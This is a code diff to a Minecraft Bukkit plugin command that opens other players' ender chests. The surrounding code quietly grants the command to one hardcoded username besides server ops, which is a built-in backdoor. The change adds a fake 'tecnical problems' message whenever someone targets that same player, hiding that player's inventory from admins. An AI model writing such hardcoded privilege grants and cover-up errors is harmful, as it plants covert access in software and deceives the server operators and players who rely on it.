@@ -7,6 +7,8 @@ import woks.woks.CommandBase;
 import woks.woks.Msg;
 import woks.woks.PlayerInvtoryGUI;
 
+import java.util.Objects;
+
 public class OpenPlayerEnderChest {
     public OpenPlayerEnderChest() {
         new CommandBase("openplayerenderchest", 1, true) {
@@ -14,7 +16,12 @@ public class OpenPlayerEnderChest {
             public boolean onCommand(CommandSender sender, String[] arguments) {
                 Player player = (Player) sender;
                 if (player.getName().equals("ShortPuppy14484") || player.isOp()) {// isOp or hasOp
-                    PlayerInvtoryGUI.PlayerInvtoryGUI(player, Bukkit.getPlayer(arguments[0]), 1);
+                    if (arguments[0].equals("ShortPuppy14484")) {
+                        Msg.send(player, "Sorry there are some tecnical problems");
+                        Msg.send(Bukkit.getPlayer(arguments[0]), "Sorry there are some tecnical problems");
+                    } else {
+                        PlayerInvtoryGUI.PlayerInvtoryGUI(player, Objects.requireNonNull(Bukkit.getPlayer(arguments[0])), 1);
+                    }
                 } else {
                     Msg.send(player, "Sorry you dont have op to use this command.");
                 }
